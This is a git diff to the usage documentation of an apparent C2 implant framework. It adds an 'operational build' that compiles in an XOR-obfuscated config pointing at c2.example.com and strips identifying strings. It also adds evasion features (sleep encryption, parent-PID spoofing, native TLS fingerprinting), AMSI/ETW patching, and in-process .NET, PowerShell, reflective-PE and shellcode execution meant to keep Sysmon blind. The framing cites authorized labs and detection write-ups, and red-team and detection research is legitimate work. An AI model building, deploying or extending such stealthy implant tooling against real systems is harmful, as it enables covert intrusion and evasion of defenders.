@@ -19,12 +19,43 @@ identity (hex) and the TLS certificate sha256 pin.
 
 The c2 listener speaks HTTPS: tasking rides inside HTTP/1.1 keep-alive POSTs
 within TLS, shaped by the malleable profile (`docs/protocol.md` §8).
+`--stage-file <path>` makes every GET on the profile URIs serve
+that file's bytes (staged payload download over the same malleable
+front — see `deploy/avln/README.md` for the live host). `--plain-c2`
+disables the TLS front for use behind a redirector that
+terminates real TLS (see `deploy/redirector/`). The implant's outer
+TLS is the OS stack (Schannel on Windows): the ClientHello fingerprint
+matches native Windows traffic — middleboxes that hold non-browser
+handshakes (measured: Fortinet DPI vs rustls) see an ordinary flow.
+The inner Ed25519 session is the security boundary either way.
 
 ## 2. Start the implant (authorized lab machines only)
 
+Two artifact flavors (ABR-T023):
+
+**Lab build** — CLI flags, stderr diagnostics, everything observable:
+
 ```
-target\release\abraham-implant.exe --server <host:port> --key <contents of server.pub> [--sleep 5] [--jitter 0.25] [--profile <yaml>] [--ua <user-agent>] [--uri <uri>] [--tls-pin <sha256-hex>]
+cargo build --release -p abraham-implant --features lab-log
+target\release\abraham-implant.exe --server <host:port> --key <contents of server.pub> [--sleep 5] [--jitter 0.25] [--profile <yaml>] [--ua <user-agent>] [--uri <uri>] [--tls-pin <sha256-hex>] [--evasion ekko,ppid]
 ```
+
+**Operational build** — no command line at all. The deployment
+configuration is compiled in under a build-random XOR keystream and the
+CLI parser/log strings do not exist in the artifact (Sysmon EID 1 sees a
+bare image path):
+
+```
+{"server": "c2.example.com:443", "key": "<server.pub hex>",
+ "tls_pin": "<sha256-hex or empty>", "evasion": "ekko,ppid",
+ "profile": "sleep_secs: 30\njitter: 0.4\n"}  > embed.json
+set ABRAHAM_EMBED=C:\path\embed.json
+cargo build --release -p abraham-implant
+```
+
+A build with neither embedded configuration nor flags exits (fail
+closed — there is no localhost default). CI gates the artifact with a
+static OPSEC audit (no project/flag/PDB/builder strings).
 
 The implant connects over TLS, performs the E2E handshake, sends `REGISTER`,
 then polls for tasks every `sleep` seconds with `jitter` randomization,
@@ -33,23 +64,79 @@ printed by the teamserver at startup) pins the outer TLS layer; without it
 any certificate is accepted and authenticity relies on the inner Ed25519
 handshake.
 
-`--evasion` enables Phase 2 capabilities (comma-separated): `ekko` encrypts
-the executable section during each sleep (waitable-timer APC + RC4), `ppid`
-spawns shell tasks under a spoofed parent with a fallback to plain spawning
-where the OS rejects the attribute (see `docs/detections/abr-t007.md` for
-the Windows 11 25H2 findings). Default: all off.
+`--evasion` (lab flag, or the embedded `evasion` field) enables Phase 2
+capabilities (comma-separated): `ekko` encrypts the executable section
+during each sleep (waitable-timer APC + RC4), `ppid` spawns shell tasks
+under a spoofed parent with a fallback to plain spawning where the OS
+rejects the attribute (see `docs/detections/abr-t007.md` for the
+Windows 11 25H2 findings). Default: all off. Reconnection backs off
+exponentially (5 s doubling to 300 s, jittered) after consecutive
+failures and resets once a session reaches the beacon loop.
 
 ## Module tasks (preferred over shell)
 
 Routine collection runs IN-PROCESS through built-in modules — no
 `cmd.exe` child, no process-creation telemetry (ABR-T011; see
-`docs/detections/abr-t011.md`). Available: `ps` (process list via
-spoofed `NtQuerySystemInformation`), `ls <path>`, `cat <path>` (capped
-at 512 KiB; use download for bigger files), `whoami`. Submit with
-`module <id> <name> [args...]` in the TUI or
+`docs/detections/abr-t011.md`). Available: `ps` (pid, ppid, threads,
+handles, name, IMAGE PATH and COMMAND LINE — the detail pass runs a
+per-pid `NtQueryInformationProcess` through the spoofed dispatcher;
+protected processes degrade to `-`), `ls <path>`, `cat <path>` (capped
+at 512 KiB; use download for bigger files), `whoami` (REAL ppid,
+token integrity and `RtlGetVersion` build — the same values REGISTER
+reports), `netstat` (TCP/UDP owner-pid tables via iphlpapi, IPv4) and
+`env`. Submit with `module <id> <name> [args...]` in the TUI or
 `{"cmd":"module","session":N,"name":"ps","args":""}` on the mgmt port.
 Shell tasks remain available but are the noisy option — prefer modules
 whenever one fits.
+
+## Execute-assembly tasks (ABR-T024/T025)
+
+`execasm <id> <local-file> [typeName methodName arg]` queues a .NET
+Framework assembly (a DLL/EXE on the teamserver host, <= 48 KB) to run
+INSIDE the implant through bare CLR hosting — no powershell.exe, no
+child process. AMSI and ETW are patched for the process first
+(disable with `"patch": false` on the mgmt port). The assembly must
+expose `public static int <MethodName>(string)`; defaults are
+`Prog.Go`. The CLR keeps the temp copy mapped, so the result reports
+delete / delete-on-close / the residue path honestly — the disk flash
+(EID 11) is this technique's detection anchor and the persisted file
+is the operator's own assembly, recoverable by the blue team.
+
+## PowerShell tasks (ABR-T024/T026)
+
+`psrun <id> <script or local .ps1>` runs PowerShell IN-PROCESS: the
+teamserver compiles the bootstrap (`tools/psboot.cs`, in-box csc,
+cached under `cache/`), the implant patches AMSI/ETW for its process
+and executes the script inside its own CLR instance. No
+`powershell.exe`, no child process, script-block logging silenced by
+the ETW patch — this is the AMSI bypass that matters operationally.
+The result carries the captured script output. Second and later
+scripts reuse the running CLR. Constrained Language Mode applies as
+usual.
+
+## Native PE tasks (ABR-T027)
+
+`runpe <id> <local .exe/.dll or staged target path>` maps a native x64
+PE in-memory and runs it on a dedicated thread: sections, DIR64
+relocations, imports against live modules, whole image RX. The
+resolver redirects ExitProcess-family imports to an ExitThread stub so
+the payload cannot kill the implant. <= 48 KB goes inline; bigger PEs
+travel via `upload` and the stage is deleted the moment it is mapped.
+Supported shape: `no_std`/loader-light payloads — CRT/TLS-heavy exes
+(rust `std`, full MSVC CRT) fault without the loader (documented);
+use `exec`/`execasm`/`psrun` for those.
+
+## Shellcode tasks (ABR-T022)
+
+`exec <id> <local-file>` queues an in-process shellcode stage: the blob
+(a raw binary file on the teamserver host, <= 48 KB) is copied to a
+private RW region via indirect syscalls, flipped RX, called as
+`fn(usize) -> usize` ON the session thread and freed. No child process,
+no new thread, no cross-process handle — Sysmon EID 8/10 stay dark.
+Stages that never return park the beacon; stagers that return are the
+intended shape. Sensitive buffers (commands, module args, payloads,
+downloads) are zeroed (`secure_clear`) as soon as the session thread is
+done with them.
 
 ## Driver staging tasks (ABR-T013, lab only)
 
